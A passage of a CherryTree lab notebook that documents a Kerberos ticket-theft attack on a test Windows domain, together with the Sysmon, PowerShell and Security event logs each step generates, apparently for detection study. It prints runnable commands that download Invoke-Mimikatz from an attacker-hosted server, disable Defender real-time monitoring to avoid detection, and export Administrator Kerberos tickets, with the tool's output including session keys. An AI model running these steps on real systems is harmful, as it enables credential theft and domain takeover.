</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="3.2.11 - File created (rule: FileCreate)" prog_lang="xml" readonly="True" tags="" ts_creation="1563099512.85" ts_lastsave="1563099553.66" unique_id="235"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Sysmon&quot; Guid=&quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot; /&gt; 
      &lt;EventID&gt;11&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;11&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-14T22:32:42.396665200Z&quot; /&gt; 
      &lt;EventRecordID&gt;847&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;3020&quot; ThreadID=&quot;4868&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-18&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;RuleName&quot; /&gt; 
      &lt;Data Name=&quot;UtcTime&quot;&gt;2019-07-14 22:32:42.388&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessGuid&quot;&gt;{43199d79-ad75-5d2b-0000-00102eb11a00}&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;4656&lt;/Data&gt; 
      &lt;Data Name=&quot;Image&quot;&gt;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1902.2-0\MpCmdRun.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetFilename&quot;&gt;C:\Windows\SERVIC~1\NETWOR~1\AppData\Local\Temp\mpam-b49d8fdb.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;CreationUtcTime&quot;&gt;2019-07-14 22:32:42.388&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="5.1. 1 - Process Create (rule: ProcessCreate)" prog_lang="xml" readonly="True" tags="" ts_creation="1563100192.93" ts_lastsave="1563100222.2" unique_id="244"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Sysmon&quot; Guid=&quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot; /&gt; 
      &lt;EventID&gt;1&lt;/EventID&gt; 
      &lt;Version&gt;5&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;1&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-14T22:45:29.280337600Z&quot; /&gt; 
      &lt;EventRecordID&gt;880&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;3020&quot; ThreadID=&quot;4868&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-18&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;RuleName&quot; /&gt; 
      &lt;Data Name=&quot;UtcTime&quot;&gt;2019-07-14 22:45:29.277&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessGuid&quot;&gt;{43199d79-b089-5d2b-0000-001028fe1e00}&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;5832&lt;/Data&gt; 
      &lt;Data Name=&quot;Image&quot;&gt;C:\Windows\System32\wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;FileVersion&quot;&gt;10.0.17763.1 (WinBuild.160101.0800)&lt;/Data&gt; 
      &lt;Data Name=&quot;Description&quot;&gt;Host process for WinRM plug-ins&lt;/Data&gt; 
      &lt;Data Name=&quot;Product&quot;&gt;Microsoft® Windows® Operating System&lt;/Data&gt; 
      &lt;Data Name=&quot;Company&quot;&gt;Microsoft Corporation&lt;/Data&gt; 
      &lt;Data Name=&quot;OriginalFileName&quot;&gt;wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;CommandLine&quot;&gt;C:\Windows\system32\wsmprovhost.exe -Embedding&lt;/Data&gt; 
      &lt;Data Name=&quot;CurrentDirectory&quot;&gt;C:\Windows\system32\&lt;/Data&gt; 
      &lt;Data Name=&quot;User&quot;&gt;BOSSMANBEN\GConcy&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{43199d79-b089-5d2b-0000-00200dfb1e00}&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonId&quot;&gt;0x1efb0d&lt;/Data&gt; 
      &lt;Data Name=&quot;TerminalSessionId&quot;&gt;0&lt;/Data&gt; 
      &lt;Data Name=&quot;IntegrityLevel&quot;&gt;High&lt;/Data&gt; 
      &lt;Data Name=&quot;Hashes&quot;&gt;MD5=AB4AB98654635CABADB5F1A60BDA1C05,SHA256=5FCCFF57D379CDC4CF6196FEF554CEF753B4C76DC315F371F90AEBF07B6A18C3&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentProcessGuid&quot;&gt;{43199d79-acd8-5d2b-0000-0010aa940000}&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentProcessId&quot;&gt;828&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentImage&quot;&gt;C:\Windows\System32\svchost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;ParentCommandLine&quot;&gt;C:\Windows\system32\svchost.exe -k DcomLaunch -p&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="5.2.11 - File created (rule: FileCreate)" prog_lang="xml" readonly="True" tags="" ts_creation="1563100195.25" ts_lastsave="1563100237.3" unique_id="245"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Sysmon&quot; Guid=&quot;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&quot; /&gt; 
      &lt;EventID&gt;11&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;4&lt;/Level&gt; 
      &lt;Task&gt;11&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-14T22:45:29.341210600Z&quot; /&gt; 
      &lt;EventRecordID&gt;881&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;3020&quot; ThreadID=&quot;4868&quot; /&gt; 
      &lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security UserID=&quot;S-1-5-18&quot; /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;RuleName&quot; /&gt; 
      &lt;Data Name=&quot;UtcTime&quot;&gt;2019-07-14 22:45:29.340&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessGuid&quot;&gt;{43199d79-b089-5d2b-0000-001028fe1e00}&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;5832&lt;/Data&gt; 
      &lt;Data Name=&quot;Image&quot;&gt;C:\Windows\system32\wsmprovhost.exe&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetFilename&quot;&gt;C:\Users\GConcy\AppData\Local\Temp\__PSScriptPolicyTest_r3ln3xso.f5t.ps1&lt;/Data&gt; 
      &lt;Data Name=&quot;CreationUtcTime&quot;&gt;2019-07-14 22:45:29.326&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node></node></node><node custom_icon_id="0" foreground="" is_bold="False" name="AD Logs" prog_lang="custom-colors" readonly="True" tags="" ts_creation="1563101667.78" ts_lastsave="1563102573.08" unique_id="246"><rich_text scale="h1" weight="heavy">LOGS GENERATED:</rich_text><rich_text>
</rich_text><rich_text scale="h2">• LogName: Security</rich_text><rich_text>:

</rich_text><rich_text scale="h3">    3.1. </rich_text><rich_text link="node 247" scale="h3">4769 - Kerberos Service Ticket Operations (Success)</rich_text><rich_text scale="h3">
    
    5.1. </rich_text><rich_text link="node 249" scale="h3">4769 - Kerberos Service Ticket Operations (Success)</rich_text><rich_text scale="h3">
</rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="LogName: Security" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1563101778.55" ts_lastsave="1563101778.55" unique_id="248"><rich_text></rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="3.1. 4769 - Kerberos Service Ticket Operations (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1563101743.42" ts_lastsave="1563101744.5" unique_id="247"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-A5BA-3E3B0328C30D}&quot; /&gt; 
      &lt;EventID&gt;4769&lt;/EventID&gt; 
      &lt;Version&gt;0&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;14337&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T01:52:56.957805300Z&quot; /&gt; 
      &lt;EventRecordID&gt;28722&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;624&quot; ThreadID=&quot;2380&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;WIN-BO2CT95INDP.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GConcy@BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceName&quot;&gt;MSEDGEWIN10$&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-1104&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketOptions&quot;&gt;0x40810000&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketEncryptionType&quot;&gt;0x12&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;::ffff:192.168.150.128&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;49856&lt;/Data&gt; 
      &lt;Data Name=&quot;Status&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{1F25205D-5704-EC56-645D-45041AAF4B49}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="5.1. 4769 - Kerberos Service Ticket Operations (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1563102297.99" ts_lastsave="1563102305.82" unique_id="249"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-A5BA-3E3B0328C30D}&quot; /&gt; 
      &lt;EventID&gt;4769&lt;/EventID&gt; 
      &lt;Version&gt;0&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;14337&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T02:04:33.498694000Z&quot; /&gt; 
      &lt;EventRecordID&gt;29439&lt;/EventRecordID&gt; 
      &lt;Correlation /&gt; 
      &lt;Execution ProcessID=&quot;624&quot; ThreadID=&quot;2380&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;WIN-BO2CT95INDP.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GConcy@BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN.LOCAL&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceName&quot;&gt;MSEDGEWIN10$&lt;/Data&gt; 
      &lt;Data Name=&quot;ServiceSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-1104&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketOptions&quot;&gt;0x40810000&lt;/Data&gt; 
      &lt;Data Name=&quot;TicketEncryptionType&quot;&gt;0x12&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;::ffff:192.168.150.128&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;49899&lt;/Data&gt; 
      &lt;Data Name=&quot;Status&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{7483D184-273B-EAC0-3F1C-0E53CB38256B}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node></node></node></node><node custom_icon_id="0" foreground="" is_bold="False" name="2. Export tickets using Invoke-Mimikatz" prog_lang="custom-colors" readonly="True" tags="" ts_creation="1562905524.65" ts_lastsave="1563107645.44" unique_id="211"><rich_text scale="h2">1. Download the exploit to the local machine (KALI-WINDOWS):
</rich_text><rich_text>
    </rich_text><rich_text justification="left"></rich_text><rich_text family="monospace">
</rich_text><rich_text>
</rich_text><rich_text scale="h2">2. Upload Invoke-Mimikatz.ps1 to the remote machine (MSEDGEWIN10):</rich_text><rich_text>

   ◇</rich_text><rich_text scale="h3"> LOCAL MACHINE (KALI-WINDOWS):</rich_text><rich_text>

    </rich_text><rich_text justification="left"></rich_text><rich_text>

   ◇</rich_text><rich_text scale="h3"> PSSession (MSEDGEWIN10):</rich_text><rich_text>

    </rich_text><rich_text justification="left"></rich_text><rich_text>

</rich_text><rich_text scale="h2">3. Use dot source to import Invoke-Mimikatz:</rich_text><rich_text>

   ◇</rich_text><rich_text scale="h3"> PSSession (MSEDGEWIN10):</rich_text><rich_text>

    </rich_text><rich_text justification="left"></rich_text><rich_text>
</rich_text><rich_text family="monospace">
</rich_text><rich_text>    </rich_text><rich_text scale="h3">NOTE(S):
      ▪ </rich_text><rich_text family="monospace" scale="h3">-DisableRealtimeMonitoring $true</rich_text><rich_text scale="h3"> prevents the remote machine from detecting Invoke-Mimikatz.ps1 as a malicious script</rich_text><rich_text>

</rich_text><rich_text scale="h2">4. Export krbtgt tickets using Invoke-Mimikatz:</rich_text><rich_text>

   ◇</rich_text><rich_text scale="h3"> PSSession (MSEDGEWIN10):</rich_text><rich_text>

    </rich_text><rich_text justification="left"></rich_text><rich_text>  
    </rich_text><rich_text justification="left"></rich_text><rich_text family="monospace">

</rich_text><rich_text>    </rich_text><rich_text scale="h3">NOTE(S):</rich_text><rich_text>
      ▪</rich_text><rich_text scale="h3"> A krbtgt ticket for the Domain (BOSSMANBEN) Administrator was exported</rich_text><rich_text>









































</rich_text><codebox char_offset="66" frame_height="70" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">git clone https://github.com/samratashok/nishang

cd .\nishang\Gather</codebox><codebox char_offset="177" frame_height="40" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="False">python -m SimpleHTTPServer</codebox><codebox char_offset="215" frame_height="70" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">cd $home\Desktop

Invoke-WebRequest -uri http://192.168.150.1:8000/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1</codebox><codebox char_offset="299" frame_height="70" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">Set-MpPreference -DisableRealtimeMonitoring $true

. .\Invoke-Mimikatz.ps1</codebox><codebox char_offset="526" frame_height="100" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">mkdir tickets

cd tickets

Invoke-Mimikatz -command '&quot;sekurlsa::tickets /export&quot;'</codebox><codebox char_offset="534" frame_height="940" frame_width="91" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="powershell" width_in_pixels="False">  .#####.   mimikatz 2.2.0 (x64) #18362 May 30 2019 09:58:36
 .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::tickets /export

...omitted...

Authentication Id : 0 ; 303469 (00000000:0004a16d)
Session           : Interactive from 1
User Name         : Administrator
Domain            : BOSSMANBEN
Logon Server      : WIN-BO2CT95INDP
Logon Time        : 7/12/2019 4:37:50 PM
SID               : S-1-5-21-2817836110-3135048609-2922248965-500

        * Username : Administrator
        * Domain   : BOSSMANBEN.LOCAL
        * Password : (null)

       Group 0 - Ticket Granting Service
        [00000000]
          Start/End/MaxRenew: 7/12/2019 4:38:17 PM ; 7/13/2019 2:38:17 AM ; 7/19/2019 4:38:17 PM
          Service Name (02) : LDAP ; WIN-BO2CT95INDP.bossmanben.local ; bossmanben.local ; @ BOSSMANBEN.LOCAL
          Target Name  (02) : LDAP ; WIN-BO2CT95INDP.bossmanben.local ; bossmanben.local ; @ BOSSMANBEN.LOCAL
          Client Name  (01) : Administrator ; @ BOSSMANBEN.LOCAL ( BOSSMANBEN.LOCAL )
          Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
          Session Key       : 0x00000012 - aes256_hmac
            4050506d21e637246324747b2d8a26a69a195020adc6bb715f19441a80075302
          Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
          * Saved to file [0;4a16d]-0-0-40a50000-Administrator@LDAP-WIN-BO2CT95INDP.bossmanben.local.kirbi !

       Group 1 - Client Ticket ?

       Group 2 - Ticket Granting Ticket
        [00000000]
          Start/End/MaxRenew: 7/12/2019 4:38:17 PM ; 7/13/2019 2:38:17 AM ; 7/19/2019 4:38:17 PM
          Service Name (02) : krbtgt ; BOSSMANBEN.LOCAL ; @ BOSSMANBEN.LOCAL
          Target Name  (02) : krbtgt ; BOSSMANBEN ; @ BOSSMANBEN.LOCAL
          Client Name  (01) : Administrator ; @ BOSSMANBEN.LOCAL ( BOSSMANBEN )
          Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
          Session Key       : 0x00000012 - aes256_hmac
            0d397fbecc40d64ac4c5852da47f10f9f757b2db4beaef1e8cdd2bb911ab8605
          Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
          * Saved to file [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi !

...omitted...</codebox><node custom_icon_id="0" foreground="" is_bold="False" name="Remote Machine Logs" prog_lang="custom-colors" readonly="True" tags="" ts_creation="1563107645.57" ts_lastsave="1563111989.96" unique_id="250"><rich_text scale="h1" weight="heavy">LOGS GENERATED:</rich_text><rich_text>
</rich_text><rich_text scale="h2">• LogName: Security</rich_text><rich_text>:
</rich_text><rich_text scale="h3">
    4.1. </rich_text><rich_text link="node 253" scale="h3">4624 - Logon (Success)</rich_text><rich_text scale="h3">
    4.2. </rich_text><rich_text link="node 252" scale="h3">4624 - Logon (Success)</rich_text><rich_text scale="h3">
</rich_text><rich_text>
</rich_text><rich_text scale="h2">• PoweShell Logs:</rich_text><rich_text>

</rich_text><rich_text scale="h3">    4.1. </rich_text><rich_text link="node 255" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    4.2. </rich_text><rich_text link="node 256" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    4.3. </rich_text><rich_text link="node 257" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    4.4. </rich_text><rich_text link="node 258" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    4.5. </rich_text><rich_text link="node 259" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    4.6. </rich_text><rich_text link="node 260" scale="h3">4103 - Executing Pipeline</rich_text><rich_text scale="h3">
    4.7. </rich_text><rich_text link="node 261" scale="h3">4103 - Executing Pipeline</rich_text><rich_text>
    
   </rich_text><rich_text scale="h3">   ◇</rich_text><rich_text scale="h3" style="italic">  4.1 - 4.7 loops multiple times</rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="LogName: Security" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1563107872.62" ts_lastsave="1563107981.5" unique_id="253"><rich_text></rich_text><node custom_icon_id="0" foreground="" is_bold="False" name="4.1. 4624 - Logon (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1563107662.47" ts_lastsave="1563107717.94" unique_id="251"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot; /&gt; 
      &lt;EventID&gt;4624&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;12544&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T03:31:23.688352300Z&quot; /&gt; 
      &lt;EventRecordID&gt;150942&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{b0de5862-3abb-0002-d858-deb0bb3ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;692&quot; ThreadID=&quot;764&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-0-0&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-1105&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GConcy&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLogonId&quot;&gt;0x21d80f&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonType&quot;&gt;3&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonProcessName&quot;&gt;NtLmSsp&lt;/Data&gt; 
      &lt;Data Name=&quot;AuthenticationPackageName&quot;&gt;NTLM&lt;/Data&gt; 
      &lt;Data Name=&quot;WorkstationName&quot;&gt;KALI-WINDOWS&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{00000000-0000-0000-0000-000000000000}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;LmPackageName&quot;&gt;NTLM V2&lt;/Data&gt; 
      &lt;Data Name=&quot;KeyLength&quot;&gt;128&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;ImpersonationLevel&quot;&gt;%%1833&lt;/Data&gt; 
      &lt;Data Name=&quot;RestrictedAdminMode&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetOutboundDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;VirtualAccount&quot;&gt;%%1843&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLinkedLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ElevatedToken&quot;&gt;%%1842&lt;/Data&gt; 
  &lt;/EventData&gt;
  &lt;/Event&gt;</rich_text></node><node custom_icon_id="0" foreground="" is_bold="False" name="4.2. 4624 - Logon (Success)" prog_lang="xml" readonly="True" tags="" ts_creation="1563107688.42" ts_lastsave="1563107778.0" unique_id="252"><rich_text>- &lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
- &lt;System&gt;
      &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-5478-4994-a5ba-3e3b0328c30d}&quot; /&gt; 
      &lt;EventID&gt;4624&lt;/EventID&gt; 
      &lt;Version&gt;2&lt;/Version&gt; 
      &lt;Level&gt;0&lt;/Level&gt; 
      &lt;Task&gt;12544&lt;/Task&gt; 
      &lt;Opcode&gt;0&lt;/Opcode&gt; 
      &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; 
      &lt;TimeCreated SystemTime=&quot;2019-07-15T03:31:23.714175100Z&quot; /&gt; 
      &lt;EventRecordID&gt;150948&lt;/EventRecordID&gt; 
      &lt;Correlation ActivityID=&quot;{b0de5862-3abb-0002-d858-deb0bb3ad501}&quot; /&gt; 
      &lt;Execution ProcessID=&quot;692&quot; ThreadID=&quot;764&quot; /&gt; 
      &lt;Channel&gt;Security&lt;/Channel&gt; 
      &lt;Computer&gt;MSEDGEWIN10.bossmanben.local&lt;/Computer&gt; 
      &lt;Security /&gt; 
  &lt;/System&gt;
- &lt;EventData&gt;
      &lt;Data Name=&quot;SubjectUserSid&quot;&gt;S-1-0-0&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectUserName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectDomainName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;SubjectLogonId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserSid&quot;&gt;S-1-5-21-2817836110-3135048609-2922248965-1105&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetUserName&quot;&gt;GConcy&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetDomainName&quot;&gt;BOSSMANBEN&lt;/Data&gt; 
      &lt;Data Name=&quot;TargetLogonId&quot;&gt;0x21d872&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonType&quot;&gt;3&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonProcessName&quot;&gt;NtLmSsp&lt;/Data&gt; 
      &lt;Data Name=&quot;AuthenticationPackageName&quot;&gt;NTLM&lt;/Data&gt; 
      &lt;Data Name=&quot;WorkstationName&quot;&gt;KALI-WINDOWS&lt;/Data&gt; 
      &lt;Data Name=&quot;LogonGuid&quot;&gt;{00000000-0000-0000-0000-000000000000}&lt;/Data&gt; 
      &lt;Data Name=&quot;TransmittedServices&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;LmPackageName&quot;&gt;NTLM V2&lt;/Data&gt; 
      &lt;Data Name=&quot;KeyLength&quot;&gt;128&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessId&quot;&gt;0x0&lt;/Data&gt; 
      &lt;Data Name=&quot;ProcessName&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpAddress&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;IpPort&quot;&gt;-&lt;/Data&gt; 
      &lt;Data Name=&quot;ImpersonationLevel&quot;&gt;%%1833&lt;/Data&gt; 
      &lt;Data Name=&quot;RestrictedAdminMode&quot;&gt;-&lt;/Data&gt; 
